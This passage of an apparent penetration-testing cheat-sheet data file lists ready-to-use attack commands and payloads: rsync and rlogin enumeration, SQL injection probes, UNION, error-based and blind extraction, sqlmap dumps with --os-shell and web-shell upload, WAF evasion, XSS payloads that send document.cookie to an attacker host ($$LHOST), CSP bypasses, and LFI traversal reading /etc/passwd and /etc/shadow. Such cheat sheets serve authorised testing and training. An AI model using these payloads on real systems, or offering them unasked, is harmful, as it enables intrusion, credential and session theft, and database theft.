            { id: "lrm5", label: "Rsync list modules", os: "Linux", command: "rsync --list-only rsync://$$IP/", notes: "List available Rsync modules (shares)." },
            { id: "lrm6", label: "Rsync list contents", os: "Linux", command: "rsync --list-only rsync://$$IP/<module>/", notes: "List files in a Rsync module." },
            { id: "lrm7", label: "Rsync download", os: "Linux", command: "rsync -av rsync://$$IP/<module>/ /tmp/rsync-loot/", notes: "Download all files from a Rsync share." }
            ]
          },
          {
            id: "lrm-rsvc",
            name: "R-Services",
            commands: [
            { id: "lrm8", label: "R-services check", os: "Linux", command: "nmap -sV -p 512,513,514 $$IP", notes: "Ports: 512=rexec, 513=rlogin, 514=rsh. Legacy — often misconfigured." },
            { id: "lrm9", label: "Rlogin (if .rhosts exists)", os: "Linux", command: "rlogin -l root $$IP", notes: "If /root/.rhosts has \"+ +\" it grants passwordless access." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 16. Web Application Tactics ─────────────────────────────────────────── */
  {
    id: 'web-recon',
    name: 'Recon & Discovery',
    icon: '🗺️',
    techniques: [
      {
        id: 'wr-dir',
        name: 'Directory Brute',
        commands: [
          { id: "wr1", label: "ffuf directory brute", os: "Linux", command: "ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200,301,302,403 -t 50", notes: "" },
          { id: "wr2", label: "feroxbuster recursive", os: "Linux", command: "feroxbuster -u $$URL -w $$WORDLIST -x php,html,txt --depth 3", notes: "Auto-recursive directory scanning." },
        ],
      },
      {
        id: 'wr-fp',
        name: 'Fingerprint & Scan',
        commands: [
          { id: "wr3", label: "whatweb fingerprint", os: "Linux", command: "whatweb -a 3 $$URL", notes: "Identify web stack, CMS, and server version." },
          { id: "wr4", label: "WAF detection", os: "Linux", command: "wafw00f $$URL", notes: "Detect and identify WAF products." },
          { id: "wr5", label: "Arjun parameter discovery", os: "Linux", command: "arjun -u $$URL/page.php", notes: "Discovers hidden GET/POST parameters." },
          { id: "wr6", label: "nuclei scan", os: "Linux", command: "nuclei -u $$URL -t /root/nuclei-templates/ -severity medium,high,critical", notes: "Template-based vulnerability scanner." },
          { id: "wr7", label: "Google dorks", os: "Both", command: "site:$$DOMAIN ext:php OR ext:asp OR ext:aspx OR ext:jsp\nsite:$$DOMAIN inurl:admin OR inurl:login OR inurl:dashboard\nsite:$$DOMAIN \"index of /\"", notes: "Paste into Google to find exposed endpoints." },
        ],
      },
    ],
  },
  {
    id: 'web-sqli',
    name: 'SQL Injection',
    icon: '💉',
    techniques: [
      {
        id: 'sqli-detect',
        name: 'Detection & Fingerprinting',
        commands: [
          { id: 'sqd1', label: 'Quote probes', os: 'Both', command: "'\n\"\n`\n')--\n\"))--\n'--\n'#", notes: 'Inject one at a time into every parameter. A SQL error or changed response = injection point.' },
          { id: 'sqd2', label: 'Boolean difference test', os: 'Both', command: "' AND 1=1-- -\n' AND 1=2-- -\n' AND 'a'='a\n' AND 'a'='b", notes: 'If page differs between TRUE/FALSE payloads, boolean injection is confirmed.' },
          { id: 'sqd3', label: 'Time-based confirmation', os: 'Both', command: "' AND SLEEP(5)-- -\n' AND IF(1=1,SLEEP(5),0)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -", notes: 'Page delay of ~5s confirms blind injection. SLEEP = MySQL, WAITFOR = MSSQL, pg_sleep = PostgreSQL.' },
          { id: 'sqd4', label: 'DB engine fingerprint', os: 'Both', command: "' AND 1=CONVERT(int,'a')-- -\n' AND extractvalue(1,concat(0x7e,version()))-- -\n' AND 1=(SELECT 1 FROM dual)-- -\n' AND version()>0-- -", notes: '"Conversion failed" = MSSQL. "XPATH syntax error" = MySQL. "dual" table = Oracle.' },
          { id: 'sqd5', label: 'Comment style probes', os: 'Both', command: "1-- -\n1#\n1/*comment*/\n1/*!50000 AND 1=1*/", notes: '-- and # = MySQL/MariaDB. Only -- works in MSSQL/PostgreSQL/Oracle. /*!...*/ = MySQL version comment.' },
          { id: 'sqd6', label: 'Header-based injection', os: 'Linux', command: "curl -H \"X-Forwarded-For: 1'\" $$URL/\ncurl -A \"test' AND SLEEP(5)-- -\" $$URL/\ncurl -H \"Referer: http://x.com' AND 1=1-- -\" $$URL/\ncurl -b \"id=1' AND SLEEP(5)-- -\" $$URL/", notes: 'Headers logged to a DB (analytics, audit trails) are often injection points.' },
          { id: 'sqd7', label: 'sqlmap banner + fingerprint', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --banner --current-user --current-db --hostname --batch", notes: 'Confirms injection and immediately grabs DB version, current user, and DB name.' },
        ],
      },
      {
        id: 'sqli-union',
        name: 'UNION Extraction',
        commands: [
          { id: 'squ1', label: '1. Column count (ORDER BY)', os: 'Both', command: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n' ORDER BY 4-- -", notes: 'Increment until error — column count = last working number.' },
          { id: 'squ2', label: '1b. Column count (UNION NULL)', os: 'Both', command: "' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL,NULL-- -", notes: 'Add NULLs until no error. Use when ORDER BY is blocked.' },
          { id: 'squ3', label: '2. Find printable columns', os: 'Both', command: "' UNION SELECT 'a',NULL,NULL-- -\n' UNION SELECT NULL,'a',NULL-- -\n' UNION SELECT NULL,NULL,'a'-- -", notes: "Replace NULL with 'a' one at a time — find columns that reflect string data in the page." },
          { id: 'squ4', label: '3. Extract DB metadata', os: 'Both', command: "' UNION SELECT @@version,NULL,NULL-- -\n' UNION SELECT user(),database(),@@datadir-- -\n' UNION SELECT @@version,DB_NAME(),SYSTEM_USER-- -", notes: 'Adjust column count. First two lines = MySQL; third line = MSSQL.' },
          { id: 'squ5', label: '4. List all databases', os: 'Both', command: "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -\n' UNION SELECT name,NULL FROM master..sysdatabases-- -", notes: 'First = MySQL. Second = MSSQL.' },
          { id: 'squ6', label: '5. List tables', os: 'Both', command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM $$DB_NAME..sysobjects WHERE xtype='U'-- -", notes: 'First = MySQL/PostgreSQL. Second = MSSQL.' },
          { id: 'squ7', label: '6. List columns', os: 'Both', command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE' AND table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('$$DB_TABLE')-- -", notes: 'First = MySQL. Second = MSSQL.' },
          { id: 'squ8', label: '7. Dump data', os: 'Both', command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE-- -\n' UNION SELECT CONCAT(username,0x3a,password),NULL FROM $$DB_TABLE-- -\n' UNION SELECT username||':'||password,NULL FROM $$DB_TABLE-- -", notes: '0x3a = colon separator. Second = MySQL CONCAT. Third = PostgreSQL string concat.' },
          { id: 'squ9', label: '8. Paginate rows (LIMIT/OFFSET)', os: 'Both', command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 0-- -\n' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 1-- -", notes: 'Extract one row at a time when only a single result is reflected.' },
        ],
      },
      {
        id: 'sqli-error',
        name: 'Error-Based',
        commands: [
          { id: 'sqe1', label: 'MySQL — extractvalue', os: 'Both', command: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1)))-- -", notes: 'Data appears in XPATH error: ~<value>. Max 31 chars per call.' },
          { id: 'sqe2', label: 'MySQL — updatexml', os: 'Both', command: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat($$DB_COLUMN) FROM $$DB_TABLE)),1)-- -", notes: 'Same 31-char limit. Use group_concat to squeeze multiple values.' },
          { id: 'sqe3', label: 'MySQL — floor/rand', os: 'Both', command: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", notes: 'Triggers "Duplicate entry" error. Works on older MySQL.' },
          { id: 'sqe4', label: 'MSSQL — convert/cast', os: 'Both', command: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -\n' AND 1=CONVERT(int,(SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE))-- -\n' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -", notes: '"Conversion failed when converting the varchar value..." — data visible in error message.' },
          { id: 'sqe5', label: 'MSSQL — HAVING / GROUP BY', os: 'Both', command: "' HAVING 1=1-- -\n' GROUP BY columnname HAVING 1=1-- -", notes: 'Reveals current table column names in error messages.' },
          { id: 'sqe6', label: 'PostgreSQL — cast error', os: 'Both', command: "' AND CAST((SELECT version()) AS int)-- -\n' AND CAST((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1) AS int)-- -", notes: '"invalid input syntax for type integer: <value>" — data in error.' },
        ],
      },
      {
        id: 'sqli-blind-bool',
        name: 'Boolean Blind',
        commands: [
          { id: 'sqbb1', label: 'Confirm boolean control', os: 'Both', command: "' AND 1=1-- -\n' AND 1=2-- -", notes: 'Response MUST differ. If both look the same, use time-based blind instead.' },
          { id: 'sqbb2', label: 'Extract DB name (char by char)', os: 'Both', command: "' AND SUBSTRING(database(),1,1)='a'-- -\n' AND ASCII(SUBSTRING(database(),1,1))>64-- -\n' AND ASCII(SUBSTRING(database(),1,1))>96-- -", notes: 'Binary search on ASCII value is faster than iterating a-z. Automate with Burp Intruder.' },
          { id: 'sqbb3', label: 'Extract table name', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))>64-- -", notes: 'Change LIMIT offset to iterate through tables.' },
          { id: 'sqbb4', label: 'Extract column data', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1 OFFSET 0),1,1))>64-- -", notes: 'Change OFFSET to iterate rows. Change position index for each character.' },
          { id: 'sqbb5', label: 'MSSQL substring', os: 'Both', command: "' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'-- -\n' AND ASCII(SUBSTRING((SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE),1,1))>64-- -", notes: 'MSSQL uses TOP 1 instead of LIMIT 1.' },
          { id: 'sqbb6', label: 'sqlmap (boolean only)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=B --level 3 --batch", notes: '--technique=B forces boolean-only. Slower but stealthier.' },
        ],
      },
      {
        id: 'sqli-blind-time',
        name: 'Time-Based Blind',
        commands: [
          { id: 'sqbt1', label: 'Baseline delay confirm', os: 'Both', command: "' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -", notes: 'MySQL = SLEEP(). MSSQL = WAITFOR DELAY. PostgreSQL = pg_sleep(). Confirm before extracting.' },
          { id: 'sqbt2', label: 'Conditional delay (MySQL)', os: 'Both', command: "' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(database()='$$DB_NAME',SLEEP(5),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(3),0)-- -", notes: 'Delay fires only on TRUE condition — confirms each character.' },
          { id: 'sqbt3', label: 'Conditional delay (MSSQL)', os: 'Both', command: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (DB_NAME()='$$DB_NAME') WAITFOR DELAY '0:0:5'-- -\n'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>90) WAITFOR DELAY '0:0:3'-- -", notes: 'MSSQL stacked query for time control.' },
          { id: 'sqbt4', label: 'Conditional delay (PostgreSQL)', os: 'Both', command: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -\n'; SELECT CASE WHEN (current_database()='$$DB_NAME') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -", notes: 'PostgreSQL CASE WHEN for conditional sleep.' },
          { id: 'sqbt5', label: 'Extract DB name via time', os: 'Both', command: "' AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(3),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),2,1))=100,SLEEP(3),0)-- -", notes: 'ASCII 97=a, 98=b etc. Iterate position and value — automate with Burp Intruder or sqlmap.' },
          { id: 'sqbt6', label: 'sqlmap (time-based only)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=T --time-sec=3 --level 3 --batch", notes: '--technique=T forces time-based only. Increase --time-sec on slow connections.' },
        ],
      },
      {
        id: 'sqli-sqlmap',
        name: 'sqlmap',
        commands: [
          { id: 'sqme1', label: 'GET parameter', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --dbs --batch", notes: 'Automatically detects and tests GET parameters in the URL.' },
          { id: 'sqme2', label: 'POST parameter', os: 'Linux', command: "sqlmap -u '$$URL/login' --data='user=admin&pass=test' -p $$VULN_PARAM --dbs --batch", notes: '-p specifies which POST param to test.' },
          { id: 'sqme3', label: 'Cookie parameter', os: 'Linux', command: "sqlmap -u '$$URL/' --cookie='id=1; session=abc' -p id --dbs --batch", notes: 'Test injectable values in cookies.' },
          { id: 'sqme4', label: 'From Burp request file', os: 'Linux', command: "sqlmap -r request.txt --dbs --batch", notes: 'Save raw HTTP request from Burp (right-click → Save item). Most reliable method.' },
          { id: 'sqme5', label: 'JSON body', os: 'Linux', command: "sqlmap -u '$$URL/api/items' --data='{\"id\":1}' --batch", notes: 'sqlmap auto-detects JSON format. Use with API endpoints.' },
          { id: 'sqme6', label: 'Full initial recon', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --current-user --current-db --hostname --dbs --batch", notes: 'Single command for full initial DB recon.' },
          { id: 'sqme7', label: 'List tables in DB', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --tables --batch", notes: '' },
          { id: 'sqme8', label: 'List columns in table', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: '' },
          { id: 'sqme9', label: 'Increase aggressiveness', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --level 5 --risk 3 --dbs --batch", notes: '--level 5 tests all params including headers/cookies. --risk 3 enables heavy payloads.' },
          { id: 'sqmx1', label: 'Dump specific table', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --dump --batch", notes: '' },
          { id: 'sqmx2', label: 'Dump specific columns', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --batch", notes: 'Faster — avoids downloading every column.' },
          { id: 'sqmx4', label: 'Crack hashes after dump', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --passwords --batch", notes: '--passwords also dumps DB auth hashes and attempts to crack them.' },
          { id: 'sqmx5', label: 'Read file from server', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --file-read='/etc/passwd' --batch\nsqlmap -u '$$VULN_URL' --file-read='C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' --batch", notes: 'Requires FILE privilege (MySQL) or BULK INSERT rights (MSSQL).' },
          { id: 'sqmx6', label: 'Write file to server', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch", notes: 'Requires FILE privilege and write permission on the target directory.' },
          { id: 'sqmx7', label: 'Interactive SQL shell', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --sql-shell --batch", notes: 'Interactive SQL prompt through the injection. Useful for manual queries.' },
          { id: 'sqmx8', label: 'OS command execution', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --os-cmd='id' --batch\nsqlmap -u '$$VULN_URL' --os-shell --batch", notes: '--os-cmd for single command, --os-shell for interactive. Uses xp_cmdshell (MSSQL) or UDF (MySQL).' },
        ],
      },
      {
        id: 'sqli-waf',
        name: 'WAF & Filter Bypass',
        commands: [
          { id: 'sqw1', label: 'Case variation', os: 'Both', command: "SeLeCt\nunIOn sElEcT\nSELECT/**/1,2,3\nsElEcT 1,2,3", notes: 'Many WAFs use case-sensitive matching. Mixed case bypasses simple keyword filters.' },
          { id: 'sqw2', label: 'Comment injection', os: 'Both', command: "SE/**/LECT\nUN/**/ION SE/**/LECT\n' UN/*comment*/ION SE/*comment*/LECT 1,2-- -\n' /*!UNION*/ /*!SELECT*/ 1,2-- -", notes: '/**/ breaks keywords for string-matching WAFs. /*!...*/ = MySQL version comment (still executes).' },
          { id: 'sqw3', label: 'URL / double encoding', os: 'Both', command: "%27 = '\n%20 = space\n%23 = #\n%2527 = double-encoded '\n' %55NION %53ELECT-- -", notes: 'Double-encoding bypasses single-decode WAFs.' },
          { id: 'sqw4', label: 'Whitespace alternatives', os: 'Both', command: "'%09UNION%09SELECT-- -\n'%0aUNION%0aSELECT-- -\n'%0dUNION%0dSELECT-- -\n' UNION(SELECT(1),(2),(3))-- -", notes: '%09=tab, %0a=newline, %0d=carriage return. Parentheses also eliminate spaces.' },
          { id: 'sqw5', label: 'Alternate comment terminators', os: 'Both', command: "-- -\n-- comment\n#\n--+\n;%00\n'/*", notes: 'Some WAFs block -- but allow #. --+ URL-decoded = -- . Try all if one is blocked.' },
          { id: 'sqw6', label: 'sqlmap tamper scripts', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --tamper=space2comment --batch\nsqlmap -u '$$VULN_URL' --tamper=between,space2comment,randomcase --batch\nsqlmap -u '$$VULN_URL' --tamper=charunicodeencode --batch", notes: 'Combine tampers for layered evasion. List all: sqlmap --list-tampers' },
          { id: 'sqw7', label: 'sqlmap WAF detection + bypass', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --identify-waf --batch\nsqlmap -u '$$VULN_URL' --level 5 --risk 3 --random-agent --delay 2 --tamper=space2comment,between --batch", notes: '--random-agent rotates User-Agent. --delay avoids rate limiting.' },
          { id: 'sqw8', label: 'HTTP parameter pollution', os: 'Both', command: "$$URL/page.php?id=1&id=2\n$$URL/page.php?id=1 UNION&id= SELECT 1,2,3-- -", notes: 'WAF may inspect only first/last param; backend uses both. Split payload across duplicate params.' },
        ],
      },
    ],
  },
  {
    id: 'web-xss',
    name: 'Cross-Site Scripting (XSS)',
    icon: '🕷️',
    techniques: [
      {
        id: 'xss-det',
        name: 'Detection',
        commands: [
          { id: "xss1", label: "Basic probe", os: "Both", command: "<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>\n\"><img src=x onerror=alert(1)>", notes: "Try in every input field, URL parameter, and HTTP header value." },
          { id: "xss2", label: "Cookie exfiltration", os: "Both", command: "<script>fetch('http://$$LHOST:$$LPORT/?c='+document.cookie)</script>", notes: "Catch with: nc -lvnp $$LPORT or a Burp Collaborator URL." },
          { id: "xss-d1", label: "dalfox scan", os: "Linux", command: "dalfox url \"$$URL/page.php?q=test\"", notes: "Context-aware XSS scanner. Also: dalfox url $$URL --crawl" },
          { id: "xss-d2", label: "XSStrike", os: "Linux", command: "python3 XSStrike.py -u \"$$URL/page.php?q=test\" --crawl", notes: "Smart XSS detection with WAF bypass and context analysis." },
          { id: "xss-d3", label: "BXSS (blind XSS probe)", os: "Both", command: "\"><script src=//$$LHOST/xss.js></script>", notes: "Blind XSS fires in admin panels or log viewers. Host a JS payload on $$LHOST and watch for callbacks." },
        ],
      },
      {
        id: 'xss-stored',
        name: 'Stored XSS',
        commands: [
          { id: "xss-s1", label: "Profile/comment payload", os: "Both", command: "<script>alert(document.cookie)</script>\n<img src=x onerror=\"this.src='http://$$LHOST/?c='+document.cookie\">", notes: "Inject into persistent fields — name, bio, comment, address, user-agent. Fires for every viewer." },
          { id: "xss-s2", label: "SVG stored", os: "Both", command: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('http://$$LHOST/?c='+btoa(document.cookie))\"/>", notes: "SVG tags may be allowed when script tags are not. Use in file upload fields that render SVG inline." },
          { id: "xss-s3", label: "HTML attribute stored", os: "Both", command: "\" onmouseover=\"alert(1)\nonclick=\"fetch('http://$$LHOST/?c='+document.cookie)", notes: "Close the attribute with \" then inject event handler. Common in name/alt/title fields." },
          { id: "xss-s4", label: "DOM clobbering", os: "Both", command: "<a id=x href=javascript:fetch('http://$$LHOST/?c='+document.cookie)>click</a>", notes: "Overwrites window properties via HTML element IDs. Works when innerHTML is used but scripts are blocked." },
        ],
      },
      {
        id: 'xss-reflected',
        name: 'Reflected & Filter Bypass',
        commands: [
          { id: "xss5", label: "Event handler tags", os: "Both", command: "<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<video src=x onerror=alert(1)>\n<details open ontoggle=alert(1)>", notes: "Use when <script> tags are blocked." },
          { id: "xss-r1", label: "Encoded payloads", os: "Both", command: "java&#115;cript:alert(1)\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<ScRiPt>alert(1)</ScRiPt>", notes: "HTML entity encoding and case mixing bypass simple keyword filters." },
          { id: "xss-r2", label: "Context: inside attribute", os: "Both", command: "\" autofocus onfocus=alert(1) x=\"\n' autofocus onfocus=alert(1) x='", notes: "Close the current attribute, inject event, and open a dummy attribute to prevent parse errors." },
          { id: "xss-r3", label: "Context: inside JS string", os: "Both", command: "';alert(1)//\n\";alert(1)//\n\\';alert(1)//", notes: "Break out of single or double quoted JavaScript string, inject code, comment remainder." },
          { id: "xss-r4", label: "Template injection via XSS", os: "Both", command: "{{7*7}}\n${7*7}\n<%= 7*7 %>", notes: "When input is reflected into an Angular/Vue/React template. Confirms SSTI if math resolves." },
        ],
      },
      {
        id: 'xss-dom',
        name: 'DOM-Based XSS',
        commands: [
          { id: "xss6", label: "DOM sources to monitor", os: "Both", command: "document.URL\ndocument.location\ndocument.referrer\nwindow.location.hash\ndocument.cookie\nlocation.search", notes: "Taint track from these sources to sinks: innerHTML, eval, document.write, setTimeout, location.href." },
          { id: "xss-do1", label: "URL fragment payload", os: "Both", command: "$$URL/page.php#<img src=x onerror=alert(1)>\n$$URL/page.php#\"><script>alert(1)</script>", notes: "Fragment (#) is never sent to server — WAF blind to it. Works when JS reads location.hash." },
          { id: "xss-do2", label: "postMessage exploitation", os: "Both", command: "<iframe src=\"$$URL\" onload=\"this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')\">", notes: "If page listens to postMessage without origin check and passes data to innerHTML → DOM XSS." },
          { id: "xss-do3", label: "DOM XSS via eval sink", os: "Both", command: "$$URL/page.php?callback=alert(1)\n$$URL/page.php?callback=fetch('http://$$LHOST/?c='+document.cookie)", notes: "JSONP-style callbacks passed to eval() or Function() are classic DOM XSS sinks." },
        ],
      },
      {
        id: 'xss-csp',
        name: 'CSP Bypass',
        commands: [
          { id: "xss-c1", label: "JSONP endpoint bypass", os: "Both", command: "<script src=\"$$URL/jsonp?callback=alert(1)\"></script>", notes: "If a whitelisted origin hosts a JSONP endpoint, use it to execute arbitrary JS in CSP context." },
          { id: "xss-c2", label: "Trusted domain abuse", os: "Both", command: "<script src=\"https://cdn.trusted.com/attacker-file.js\"></script>", notes: "If CSP allows *.cdn.com and attacker controls a file on that CDN — CSP bypassed." },
          { id: "xss-c3", label: "unsafe-inline bypass (nonce leak)", os: "Both", command: "# Look for nonce in source:\n# <script nonce=\"abc123\">\n# Reuse in payload:\n<script nonce=\"abc123\">alert(1)</script>", notes: "If nonce is static or reflected in the page, it can be stolen and reused." },
          { id: "xss-c4", label: "data: URI bypass", os: "Both", command: "<object data=\"data:text/html,<script>alert(1)</script>\">", notes: "Works when CSP allows data: URIs. Common misconfiguration." },
          { id: "xss-c5", label: "Check CSP header", os: "Linux", command: "curl -sI $$URL | grep -i content-security-policy", notes: "Weak CSP: unsafe-inline, unsafe-eval, wildcard (*), or no script-src. Use csp-evaluator.withgoogle.com." },
        ],
      },
    ],
  },
  {
    id: 'web-lfi',
    name: 'File Inclusion',
    icon: '📂',
    techniques: [
      {
        id: 'lfi-disc',
        name: 'File Disclosure',
        description: 'Read local files via LFI, path traversal, filter bypasses, and PHP wrappers.',
        tags: ['web', 'lfi'],
        subtechniques: [
          {
            id: 'lfi-st-basic',
            name: 'Local File Inclusion',
            commands: [
              { id: 'lfi-r2', label: 'Confirm LFI — absolute path (direct include)', os: 'Both', command: '$$URL/index.php?language=/etc/passwd\n$$URL/index.php?language=C:\\Windows\\win.ini', notes: 'If include() uses the raw parameter value (include($_GET["language"])) the absolute path works directly. Linux: /etc/passwd. Windows: C:\\Windows\\win.ini or C:\\Windows\\boot.ini' },
              { id: 'lfi1', label: 'Path traversal (relative)', os: 'Both', command: '$$URL/index.php?language=../../../../etc/passwd\n$$URL/index.php?language=../../../../etc/shadow\n$$URL/index.php?language=../../../../Windows/win.ini', notes: 'Use when include prepends a directory (e.g. include("./langs/" . $lang)). Start with 4 levels — add more if it fails. Overrunning to / is safe: extra ../ at root stays at root.' },
              { id: 'lfi-r3', label: 'Find correct traversal depth', os: 'Linux', command: '# Web root is commonly /var/www/html/ (3 dirs from /)\n../../../etc/passwd        # 3 levels\n../../../../etc/passwd     # 4 levels\n../../../../../etc/passwd  # 5 levels\n# Add ../ until you get output — more than needed is fine.', notes: 'Each directory in the web root path needs one level of ../. /var/www/html = 3 levels minimum.' },
              { id: 'lfi-r1', label: 'Common sensitive files to read', os: 'Both', command: '# Linux:\n/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/ssh/sshd_config\n/proc/self/environ\n/proc/self/cmdline\n/var/log/apache2/access.log\n/var/log/nginx/access.log\n/var/log/auth.log\n# Windows:\nC:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\logs\\LogFiles\\W3SVC1\\', notes: 'Build target list based on OS and tech stack. /etc/passwd confirms LFI. /etc/shadow requires root. Logs are RCE vectors via poisoning.' },
              { id: 'lfi-r4', label: 'Read current PHP source via traversal', os: 'Both', command: '$$URL/index.php?language=../../../../var/www/html/index\n$$URL/index.php?language=php://filter/convert.base64-encode/resource=../../../../var/www/html/index', notes: 'Read the current file to understand include logic and find more parameters. Use base64 wrapper if direct include executes the PHP instead of showing source.' },
            ],
          },
          {
            id: 'lfi-st-bypass',
            name: 'Basic Bypasses',
            commands: [
              { id: 'lfi-b4', label: 'Non-recursive filter bypass (....//)', os: 'Both', command: '# Filter: str_replace("../", "", $input) — removes ../ once, not recursively\n# Use ....// → after ../ is stripped, becomes ../\n$$URL/index.php?language=....//....//....//....//etc/passwd\n# Variants:\n$$URL/index.php?language=..././..././..././..././etc/passwd\n$$URL/index.php?language=....\\....\\....\\....\\etc/passwd', notes: 'Works when filter does a single non-recursive str_replace of ../. The outer dots rebuild the ../ after the inner ../ is stripped. Also try ..././ and ..../\\' },
              { id: 'lfi-b2', label: 'URL encoding bypass', os: 'Both', command: '# Single encode: ../  →  %2e%2e%2f (encode dots too, not just slashes)\n$$URL/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64\n# Double encode: ../  →  %252e%252e%252f\n$$URL/index.php?language=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', notes: 'Single encode bypasses filters that block . and / chars. Double encode bypasses single-decode WAFs: server decodes %25→%, then %2e→. and %2f→/. Must encode dots AND slashes.' },
              { id: 'lfi-b8', label: 'Approved path bypass', os: 'Both', command: '# When app enforces a path prefix via regex:\n# preg_match("/^\\.\\\/languages\\/.+$/", $input)\n# Satisfy the regex first, then traverse out:\n$$URL/index.php?language=./languages/../../../../etc/passwd\n# Combine with encoding if a second filter also applies:\n$$URL/index.php?language=./languages/..%2f..%2f..%2f..%2fetc%2fpasswd', notes: 'If the app only allows paths starting with ./languages/, prepend it to satisfy the regex then break out with ../. Fuzz sub-paths under the approved prefix to find the right one.' },
              { id: 'lfi-b3', label: 'Path truncation — appended extension (PHP < 5.3/5.4)', os: 'Linux', command: '# PHP truncates strings at 4096 chars — appended .php gets cut off.\n# Payload must start with a NON-EXISTING directory.\n# Generate with bash:\necho -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done\n# Then inject the full output string as the parameter value.', notes: 'PHP < 5.3/5.4 only. The /./  padding fills the 4096-char limit so .php is truncated and dropped. Must start with a non-existing directory for the technique to work.' },
              { id: 'lfi-b1', label: 'Null byte — appended extension bypass (PHP < 5.5)', os: 'Both', command: '# When app does: include($input . ".php")\n$$URL/index.php?language=../../../../etc/passwd%00\n# Result: include("../../../../etc/passwd\0.php") → PHP stops at null byte\n# → effectively includes /etc/passwd without the .php', notes: 'PHP < 5.5 only. %00 terminates the C string in memory — .php after the null byte is ignored by include(). Patched in PHP 5.5 (2013) but still found on legacy servers.' },
